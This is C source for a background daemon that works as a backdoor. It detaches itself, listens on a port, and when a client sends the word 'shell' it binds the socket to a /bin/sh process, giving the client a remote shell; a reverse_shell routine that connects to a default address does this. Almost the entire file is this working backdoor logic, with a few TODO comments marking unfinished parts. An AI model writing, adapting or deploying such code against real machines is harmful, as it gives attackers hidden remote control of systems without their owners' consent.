#include "durex.h"

void    reverse_shell(int socket)
{
    struct sockaddr_in sa;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(DEFAULT_ADDR);
    sa.sin_port = htons(atoi(DEFAULT_PORT));

    connect(socket, (struct sockaddr *)&sa, sizeof(sa));
    dup2(socket, 0);
    dup2(socket, 1);
    dup2(socket, 2);

    // fork
    char *sdf[] = {NULL};
    execv("/bin/sh", sdf);
    return ;
}

void    pending_connection(t_info *info)
{
    int client;
    int len = 0;
    char buffer[1025] = {0};

    struct sockaddr_in csin = {0};
    unsigned int size = sizeof(csin);

    // todo : create entry for each conection
    client = accept(info->socket, (struct sockaddr*)&csin, &size);
    while (true)
    {
        len = recv(client, buffer, 1024, 0);

        // todo : Create handler module for commands
        if (strncmp("shell", buffer, 5) == 0)
            reverse_shell(client);

        ft_bzero(buffer, len);
    }
    close(client);
    return ;
}

int     main(int ac, char **av)
{
    t_info serv;

    create_daemon_old_style();

    if (ac == 2)
        initialize(&serv, av[1]);
    else
        initialize(&serv, DEFAULT_PORT);

    pending_connection(&serv);
    close(serv.socket);
    return (0);
}
